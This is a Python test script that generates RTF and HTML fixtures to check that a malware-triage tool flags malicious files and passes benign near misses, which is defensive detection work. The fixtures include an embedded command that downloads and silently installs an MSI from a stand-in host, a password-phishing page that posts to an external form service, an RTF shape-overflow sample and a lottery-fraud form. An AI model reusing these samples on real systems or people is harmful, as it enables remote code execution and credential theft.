#!/usr/bin/env python3
"""Exercise RTF payload decoding and attack rules with benign near misses."""
import argparse
import json
from pathlib import Path
import struct
import subprocess
import tempfile
from urllib.parse import quote

ROOT = Path(__file__).resolve().parents[2]


def ole(class_name, native):
    name = class_name.encode() + b"\0"
    return (struct.pack("<III", 0x105, 2, len(name)) + name
            + struct.pack("<III", 0, 0, len(native)) + native)


def object_doc(blob, update=False, interleaved=False):
    data = blob.hex()
    if interleaved:
        # Formatting names, parameter values and group boundaries are mutable.
        data = "".join("{\\f27 " + "".join(c + " \\c731 " for c in data[i:i+8]) + "}"
                       for i in range(0, len(data), 8))
    return ("{\\rtf1{\\object\\objemb" + ("\\objupdate" if update else "")
            + "{\\*\\objdata " + data + "}}}").encode()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cleave", default=str(ROOT.parent / "cleave/target/release/cleave"))
    args = parser.parse_args()
    cfb = bytes.fromhex("d0cf11e0a1b11ae1")
    command = b"cmd /c msiexec.exe /i https://example.invalid/payload.msi /qn"
    shape = lambda name, value: "{\\sp{\\sn " + name + "}{\\sv " + value + "}}"
    markup = '''<html><p>Please enter the password for your Microsoft account.</p>
<form><input type="password" name="first"><input type="password" name="second"></form>
<script>function submit(){ if (ready) { $('#retained').val(entry.val()); $('#a').hide(); } return false; }
const payload = new FormData(form);
fetch('https://nocodeform.io/f/placeholder', {method: "POST", body: payload});</script></html>'''
    encoded = ("{\\rtf2\\\n<script>document.write(unescape('" + quote(markup)
               + "'))</script>" + " " * 3000).encode()
    fraud = rb'''{\rtf1\ansi Abschliessende Mitteilung fuer die Zahlung des nicht beanspruchten Preisgeldes.
Unsere Lotteriefirma bittet Sie mit unserer Rechtsanwaeltin in Verbindung zu treten.
ANMELDEFORMULAR FUR DEN GEWINNANSPRUCH\par
ANSCHRIFT:........ TELEFON:........ BERUF:........ GEB.DATUM:........}'''
    fixtures = {
        "interleaved.rtf": object_doc(ole("Package", cfb + command), True, True),
        "plain-update.rtf": object_doc(ole("Package", cfb), True),
        "bitmap.rtf": object_doc(ole("PBrush", b"BM" + bytes(1500))),
        "formula-word.rtf": b"{\\rtf1\\ansi ANMELDEFORMULAR and FORMULA are ordinary words.}",
        "shape-bad.rtf": ("{\\rtf1{\\shp" + shape("pFraments", "1;S;" + "41" * 300) + "}}").encode(),
        "shape-small.rtf": ("{\\rtf1{\\shp" + shape("pFragments", "1;2;4142") + "}}").encode(),
        "shape-unrelated.rtf": ("{\\rtf1{\\shp" + shape("pFragments", "1;2;4142")
                                + shape("other", "1;2;" + "41" * 300) + "}}").encode(),
        "phishing.rtf": encoded,
        "phishing.html": markup.encode(),
        "legitimate.html": markup.replace("https://nocodeform.io/f/placeholder", "/session").encode(),
        "separate-contact.html": markup.replace("$('#retained').val(entry.val());", "").encode(),
        "fraud.rtf": fraud,
        "onboarding.rtf": fraud.replace(b"nicht beanspruchten Preisgeldes", b"Bewerbungsunterlagen")
                               .replace(b"Lotteriefirma", b"Personalabteilung"),
    }
    with tempfile.TemporaryDirectory(prefix="rtf-triage-controls-") as work:
        paths = []
        for name, contents in fixtures.items():
            path = Path(work) / name
            path.write_bytes(contents)
            paths.append(str(path))
        result = subprocess.run([args.cleave, "--traits-dir", str(ROOT), "--json", *paths],
                                capture_output=True, text=True, check=True)
        reports = {Path(f["path"]).name: f for line in result.stdout.splitlines()
                   for f in json.loads(line)["files"]}
        ids = lambda name: {t["id"] for t in reports[name].get("traits", [])}
        severity = lambda name, level: [t for t in reports[name].get("traits", []) if t["crit"] >= level]
        for name in ("bitmap.rtf", "formula-word.rtf", "plain-update.rtf", "onboarding.rtf",
                     "legitimate.html", "separate-contact.html"):
            assert not severity(name, 5), (name, severity(name, 5))
        for name in ("bitmap.rtf", "formula-word.rtf"):
            assert not severity(name, 4), (name, severity(name, 4))
        for name in ("shape-small.rtf", "shape-unrelated.rtf"):
            assert not severity(name, 5), (name, severity(name, 5))
        assert "objectives/execution/exploit/document::rtf-shape-property-overflow" in ids("shape-bad.rtf")
        assert len(severity("interleaved.rtf", 5)) >= 3, severity("interleaved.rtf", 5)
        assert len(severity("phishing.rtf", 5)) >= 3, ids("phishing.rtf")
        assert severity("phishing.html", 5)
        assert len(severity("fraud.rtf", 4)) >= 3, severity("fraud.rtf", 4)
    print(f"RTF triage: {len(fixtures)} controls passed")


if __name__ == "__main__":
    main()
